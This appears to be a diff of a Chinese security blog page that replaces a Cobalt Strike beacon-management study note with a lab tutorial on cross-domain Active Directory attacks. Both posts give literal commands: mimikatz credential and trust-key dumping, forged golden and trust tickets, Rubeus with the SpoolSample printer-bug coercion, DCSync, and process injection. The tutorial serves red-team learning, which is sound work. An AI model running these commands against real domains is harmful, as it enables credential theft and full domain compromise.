@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【CS学习笔记】10、如何管理Payload载荷, TeamsSix">
+    <meta name="keywords" content="【内网学习笔记】30、跨域安全（完结）, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>【CS学习笔记】10、如何管理Payload载荷 | TeamsSix</title>
+    <title>【内网学习笔记】30、跨域安全（完结） | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -271,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs10-1.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【CS学习笔记】10、如何管理Payload载荷</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】30、跨域安全（完结）</h1>
                 </div>
             </div>
         </div>
@@ -400,8 +400,8 @@
                                 <span class="chip bg-color">学习笔记</span>
                             </a>
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -412,8 +412,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -425,28 +425,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-19
+                    2021-10-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-10-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    5 分
                 </div>
                 
 
@@ -469,62 +469,88 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>到目前为止，已经学过了如何在有漏洞的目标上获取立足点的方法，接下来将继续学习后渗透相关的知识，这一节就来学习学习 beacon 的管理、会话传递等。</p>
-<h1 id="0x01-Beacon-的管理"><a href="#0x01-Beacon-的管理" class="headerlink" title="0x01 Beacon 的管理"></a>0x01 Beacon 的管理</h1><h2 id="Beacon-控制台"><a href="#Beacon-控制台" class="headerlink" title="Beacon 控制台"></a>Beacon 控制台</h2><p>在一个 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs10-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p>
-<p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p>
-<h2 id="Beacon-菜单"><a href="#Beacon-菜单" class="headerlink" title="Beacon 菜单"></a>Beacon 菜单</h2><p>Access：包含了一些对凭据的操作及提权的选项</p>
-<p>Explore：包含了信息探测与目标交互的选项</p>
-<p>Pivoting：包含了一些设置代理隧道的选项</p>
-<p>Session：包含了对当前 Beacon 会话管理的选项</p>
-<h2 id="Beacon-命令"><a href="#Beacon-命令" class="headerlink" title="Beacon 命令"></a>Beacon 命令</h2><p>help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</p>
-<p>clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。</p>
-<p>sleep：改变 Beacon 的休眠时间。输入 <code>sleep 30</code>表示休眠30秒；输入<code>sleep 60 50</code>表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 <code>sleep 0</code>则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如<code>desktop</code>时， Beacon 会自动进入交互模式。</p>
-<p>shell：通过受害主机的 cmd.exe 执行命令。比如运行<code>ipconfig</code>，就需要输入<code>shell ipconfig</code></p>
-<p>run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</p>
-<p>execute：执行命令，但不回显结果。</p>
-<p>cd：切换当前工作目录。</p>
-<p>pwd：查看当前所在目录。</p>
-<p>powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 <code>ipconfig</code>，就需要输入<code>powershell ipconfig</code></p>
-<p>powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</p>
-<p>psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</p>
-<p>powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</p>
-<p>powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入<code>powershell get-help  get-process</code></p>
-<p>execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</p>
-<p>setenv：设置一个环境变量。</p>
-<h1 id="0x02-会话传递"><a href="#0x02-会话传递" class="headerlink" title="0x02 会话传递"></a>0x02 会话传递</h1><h2 id="会话传递相关命令"><a href="#会话传递相关命令" class="headerlink" title="会话传递相关命令"></a>会话传递相关命令</h2><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p>
-<p><code>spawn</code>：进行会话的传递，也可直接右击会话选择<code>spawn</code>命令进行会话的选择。默认情况下，<code>spawn</code>命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用<code>spawnto</code>命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p>
-<p><code>spawnto</code>：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入<code>spawnto</code>命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p>
-<p><code>inject</code>：输入<code>inject + 进程 id + 监听器名</code>来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用<code>inject [pid] x64</code>来将一个64位 Beacon 注入到一个 64位进程中。</p>
-<p><code>spawn</code>和<code>inject</code>命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p>
-<p><code>dllinject</code>：<code>dllinject + [pid]</code>来将一个反射性 DLL 注入到一个进程中。</p>
-<p><code>shinject</code>：使用<code>shinject [pid] [架构] [/路径/.../file.bin]</code>命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p>
-<p><code>shspawn</code>：使用<code>shspawn [架构] [/路径/.../file.bin]</code>命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p>
-<p><code>dllload</code>：使用<code>dllload [pid] [c:\路径\...\file.dll]</code>来在另一个进程中加载磁盘上的 DLL文件。</p>
-<h2 id="会话传递使用场景"><a href="#会话传递使用场景" class="headerlink" title="会话传递使用场景"></a>会话传递使用场景</h2><p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p>
-<p>2、将当前会话传递至MSF中，这里简单做一下演示。</p>
-<p>首先，在MSF中，为攻击载荷新建一个payload</p>
-<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handler
-msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https
-msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.156
-msf5 exploit(multi&#x2F;handler) &gt; set lport 443
-msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p>
+<p>i、利用常规的渗透方法，比如 Web 漏洞</p>
+<p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p>
+<p>iii、利用域信任关系</p>
+<p>这里主要看第三种：域信任关系</p>
+<p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p>
+<p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p>
+<p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p>
+<p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p>
+<h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p>
+<p>枚举 teamssix 域中的用户组</p>
+<pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p>
-<h1 id="0x03-文件系统"><a href="#0x03-文件系统" class="headerlink" title="0x03 文件系统"></a>0x03 文件系统</h1><p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p>
-<p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p>
-<p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p>
-<h1 id="0x04-文件下载"><a href="#0x04-文件下载" class="headerlink" title="0x04 文件下载"></a>0x04 文件下载</h1><p><code>download</code>：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p>
-<p><code>downloads</code>：查看当前 Beacon 正在进行的文件下载列表。</p>
-<p><code>cancel</code>：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p>
-<p>下载文件都将下载到CS团队服务器中，在<code>View --&gt; Download</code>下可看到下载文件的记录，选中文件后使用<code>Sync Files</code>即可将文件下载到本地。</p>
-<h1 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h1><p><code>upload</code>：上传一个文件到目标主机上。</p>
-<p><code>timestomp</code>：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p>
+<p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p>
+<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>枚举远程计算机的用户名</p>
+<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>枚举远程系统中全部用户的 SID</p>
+<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>枚举远程系统指定组中的所有成员的 SID</p>
+<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p>
+<p>父域的域控：dc.teamssix.com</p>
+<p>子域的域控：subdc.sub.teamssix.com</p>
+<p>子域内的计算机：user4.sub.teamssix.com</p>
+<p>子域内的普通用户：user4</p>
+<p>在子域的域控中使用 mimikatz 获取需要的信息</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p>
 <blockquote>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>
+<p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p>
+<pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将获取的 TGS 票据注入到内存中</p>
+<pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用 dir 访问目标域控</p>
+<pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211307519.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
+<p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在子域普通用户权限的计算机中构造黄金票据</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211315739.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p>
+<p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p>
+<p>首先在 teamssix.com 的域控上监听身份认证请求</p>
+<pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p>
+<pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获得票据后，使用 rubeus 将票据注入内存</p>
+<pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用 mimikatz 获取目标的 krbtgt 散列值</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
@@ -554,7 +580,7 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/200419-150531.html">https://www.teamssix.com/200419-150531.html</a>
+                    <a href="https://www.teamssix.com/211022-122217.html">https://www.teamssix.com/211022-122217.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -600,8 +626,8 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
                                     <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -646,7 +672,7 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2020-04-19T15-05-31',
+        id: '2021-10-22T12-22-17',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -672,40 +698,42 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/200419-150538.html">
+                <a href="/211022-122217.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-1.png" class="responsive-img" alt="【CS学习笔记】11、用户驱动溢出攻击">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
                         
-                        <span class="card-title">【CS学习笔记】11、用户驱动溢出攻击</span>
+                        <span class="card-title">【内网学习笔记】30、跨域安全（完结）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Beacon 运行任务的方式是以`jobs`去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -717,8 +745,8 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -732,30 +760,30 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/200419-150524.html">
+                <a href="/211009-145524.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-4.png" class="responsive-img" alt="【CS学习笔记】9、Metasploit框架">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png" class="responsive-img" alt="【内网学习笔记】29、白银票据">
                         
-                        <span class="card-title">【CS学习笔记】9、Metasploit框架</span>
+                        <span class="card-title">【内网学习笔记】29、白银票据</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -773,8 +801,8 @@ msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
